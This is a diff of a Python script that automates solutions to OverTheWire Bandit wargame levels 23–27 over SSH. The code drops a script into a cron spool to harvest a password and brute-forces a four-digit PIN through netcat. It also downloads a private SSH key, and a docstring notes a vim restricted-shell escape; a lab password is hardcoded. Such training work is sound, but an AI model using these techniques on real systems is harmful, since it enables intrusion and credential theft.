@@ -416,14 +416,14 @@ def bandit22_23(client):
 
     return next_user, next_password
 
+# DONE
 def bandit23_24(client):
 
     next_user = "bandit24"
+    next_password = ""
 
     stdin, stdout, stderr = client.exec_command("mktemp -d")
     temp_dir = stdout.read().decode().strip()
-    # temp_dir = "/tmp/tmp.5IUhLj88fz"
-    print("Temp dir: " + temp_dir)
     
     stdin, stdout, stderr = client.exec_command("chmod o+wx " + temp_dir)
     
@@ -434,52 +434,50 @@ def bandit23_24(client):
     stdin, stdout, stderr = client.exec_command("cp " + temp_dir + "/script.sh /var/spool/bandit24/foo/testing")
     
     stdin, stdout, stderr = client.exec_command("chmod +x /var/spool/bandit24/foo/testing")
+        
+    while not next_password:
+        stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password 2>/dev/null | tr '\\n' ' '")
+        next_password = stdout.read().decode("utf-8").strip()
+        if len(stdout.read().decode("utf-8").strip()) != 0:
+            break
     
-    # sftp = client.open_sftp()
-    # print(sftp.stat(temp_dir + "/bandit24.password"))
-    
-    passfile_exists = False
-    
-    while not passfile_exists:
-        stdin, stdout, stderr = client.exec_command("ls " + temp_dir + " | grep -v 'script.sh'")
-        time.sleep(1)
-        print("Result: " + stdout.read().decode().strip())
-        if "bandit24.password" in stdout.read().decode():
-            stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password")
-            passfile_exists = True
-    
-    # while True:
-    #     stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password")
-    #     stdout.channel.recv_exit_status() # Wait until the command finish
-    #     print("Result: " + stdout.read().decode().strip())
-    #     if not stdout.read().decode().strip():
-    #         break
-    
-    next_password = stdout.read().decode().strip()
-
     client.close()
 
     return next_user, next_password
 
+# DONE
 def bandit24_25(client):
 
     next_user = "bandit25"
+    
+    stdin, stdout, stderr = client.exec_command("mktemp -d")
+    temp_dir = stdout.read().decode().strip()
+    
+    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit24")
+    current_password = stdout.read().decode().strip()
 
-    # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("for pin in {0000..9999}; do echo \"" + current_password + " $pin\"; done > " + temp_dir + "/combinations.txt")
+    
+    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/combinations.txt | nc localhost 30002 | grep -vE 'Wrong|Please enter' | grep password | awk 'NF{print $NF}'")
     next_password = stdout.read().decode().strip()
 
     client.close()
 
     return next_user, next_password
 
+# DONE
 def bandit25_26(client):
 
     next_user = "bandit26"
 
-    # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
-    next_password = stdout.read().decode().strip()
+    resources_path = createResourcesFolder()
+    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit25_26')
+
+    sftp = client.open_sftp()
+    sftp.get('/home/bandit25/bandit26.sshkey',os.path.join(subfolder_path,'id_rsa'))
+
+    # Process to obtain the ssh key file
+    next_password = os.path.join(str(subfolder_path),'id_rsa')
 
     client.close()
 
@@ -488,9 +486,25 @@ def bandit25_26(client):
 def bandit26_27(client):
 
     next_user = "bandit27"
+    
+    """
+    
+    ssh -i bandit26.sshkey -o StrictHostKeyChecking=accept-new bandit26@bandit.labs.overthewire.org -p 2220
+    
+    vim --cmd ':set shell=/bin/sh|:shell'
+    
+    stty rows 21 columns 129
+    
+    
+    #!/bin/bash
+    stty rows 3 columns 129
+
+    ssh -i /home/bandit25/bandit26.sshkey -o StrictHostKeyChecking=accept-new bandit26@bandit.labs.overthewire.org -p 2220
+    
+    """
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("whoami")
     next_password = stdout.read().decode().strip()
 
     client.close()
@@ -574,15 +588,15 @@ def printCredentials():
 
 if __name__ == '__main__':
     # DEBUG
-    user = "bandit23"
-    password = "0Zf11ioIjMVN551jX3CmStKLYqjk54Ga"
-    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit16_17\\id_rsa"
+    user = "bandit26"
+    # password = "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"
+    password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit25_26\\id_rsa"
 
     # user, password = bandit22_23(ssh_connection(user, password))
     # printCredentials()
     
-    user, password = bandit23_24(ssh_connection(user, password))
-    printCredentials()
+    # user, password = bandit23_24(ssh_connection(user, password))
+    # printCredentials()
     
     # user, password = bandit24_25(ssh_connection(user, password))
     # printCredentials()
@@ -590,8 +604,8 @@ if __name__ == '__main__':
     # user, password = bandit25_26(ssh_connection(user, password))
     # printCredentials()
     
-    # user, password = bandit26_27(ssh_connection(user, password))
-    # printCredentials()
+    user, password = bandit26_27(ssh_connection(user, password,use_ssh_key=True,sshkey_file=password))
+    printCredentials()
     
     # user, password = bandit27_28(ssh_connection(user, password))
     # printCredentials()
